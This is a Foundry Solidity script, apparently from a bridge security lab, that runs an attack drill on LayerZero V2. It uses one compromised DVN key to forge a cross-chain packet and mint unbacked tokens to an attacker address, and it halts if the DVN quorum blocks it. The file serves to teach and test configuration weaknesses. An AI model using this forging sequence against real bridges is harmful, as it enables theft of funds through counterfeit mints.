// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {console} from "forge-std/Script.sol";
import {LabBase} from "./LabBase.s.sol";
import {EndpointV2, Origin} from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import {ReceiveUln302} from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/uln302/ReceiveUln302.sol";
import {UlnConfig} from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import {LabDVN} from "../src/lab/LabDVN.sol";

/// @notice Topic 3 ATTACK DRILL (lab only): someone holding ONE DVN's key forges "the home chain locked AMOUNT"
/// and tries to mint it to ATTACKER on the connected chain. Nothing is locked anywhere.
///   1. compromised DVN attests the forged packet   (LabDVN.verify, needs that DVN's key)
///   2. commitVerification                          (permissionless; reverts unless the OApp's DVN quorum is met)
///   3. lzReceive -> OFT mints to the attacker      (permissionless)
/// Stops after step 1 if the receive config needs more DVNs than the attacker controls.
/// env: PRIVATE_KEY (the compromised DVN operator), ASSET, AMOUNT (whole tokens), ATTACKER
contract ForgeMint is LabBase {
    function run() external {
        string memory asset = vm.envString("ASSET");
        string memory home = vm.parseJsonString(topology(), string.concat(".assets.", asset, ".home"));
        EndpointV2 endpoint = EndpointV2(existing("EndpointV2"));
        ReceiveUln302 receiveLib = ReceiveUln302(existing("ReceiveUln302"));
        address receiver = existing(asset);
        bytes32 sender = bytes32(uint256(uint160(recorded(chainUint(home, "chainId"), asset)))); // the real home adapter
        uint32 srcEid = eidOf(home);

        // next nonce on the path home -> here, so the endpoint will accept it
        uint64 nonce = endpoint.inboundNonce(receiver, srcEid, sender) + 1;
        bytes32 guid = keccak256(abi.encode("forged", nonce, block.timestamp));
        // OFT message: recipient (bytes32) + amount in shared decimals (uint64)
        bytes memory message = abi.encodePacked(bytes32(uint256(uint160(vm.envAddress("ATTACKER")))), uint64(vm.envUint("AMOUNT") * 1e6));
        bytes memory header = abi.encodePacked(uint8(1), nonce, srcEid, sender, uint32(endpoint.eid()), bytes32(uint256(uint160(receiver))));
        bytes32 payloadHash = keccak256(abi.encodePacked(guid, message));
        console.log("forging", asset, "nonce", nonce);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        LabDVN(existing("LabDVN")).verify(address(receiveLib), header, payloadHash, 1);
        console.log("1. compromised LabDVN attested the forged packet");

        UlnConfig memory cfg = receiveLib.getUlnConfig(receiver, srcEid);
        if (!receiveLib.verifiable(cfg, keccak256(header), payloadHash)) {
            console.log("2. BLOCKED: commitVerification would revert, receive config requires DVNs:", cfg.requiredDVNCount);
            vm.stopBroadcast();
            return;
        }
        receiveLib.commitVerification(header, payloadHash);
        console.log("2. committed: one DVN was enough for this OApp");
        endpoint.lzReceive(Origin(srcEid, sender, nonce), receiver, guid, message, "");
        console.log("3. delivered: forged tokens minted to the attacker");
        vm.stopBroadcast();
    }
}
